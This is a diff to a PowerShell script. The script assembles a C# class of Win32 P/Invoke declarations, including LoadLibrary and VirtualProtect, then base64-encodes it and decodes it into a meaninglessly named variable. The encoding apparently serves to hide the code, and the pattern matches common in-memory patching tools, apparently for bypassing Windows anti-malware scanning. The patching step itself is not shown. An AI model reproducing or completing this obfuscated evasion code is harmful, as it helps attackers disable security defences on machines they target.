@@ -1,4 +1,3 @@
-$line0 = "@`""
 $line1 = "using System;"
 $line2 = "using System.Runtime.InteropServices;"
 $line3 = "public class Win32 {"
@@ -9,9 +8,8 @@ $line7 = "public static extern IntPtr LoadLibrary(string name);"
 $line8 = "[DllImport(`"kernel32`")]"
 $line9 = "public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);"
 $line10 = "}"
-$line11 = "`"@"
 
-$exec_line = $line0 + "`n" + $line1 + "`n" + $line2 + "`n" + $line3 + "`n" + $line4 + "`n" + $line5 + "`n" + $line6 + "`n" + $line7 + "`n" + $line8 + "`n" + $line9 + "`n" + $line10 + "`n" + $line11
+$exec_line = $line1 + "`n" + $line2 + "`n" + $line3 + "`n" + $line4 + "`n" + $line5 + "`n" + $line6 + "`n" + $line7 + "`n" + $line8 + "`n" + $line9 + "`n" + $line10
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($exec_line)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 ${kasdnfasdf} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedText)))
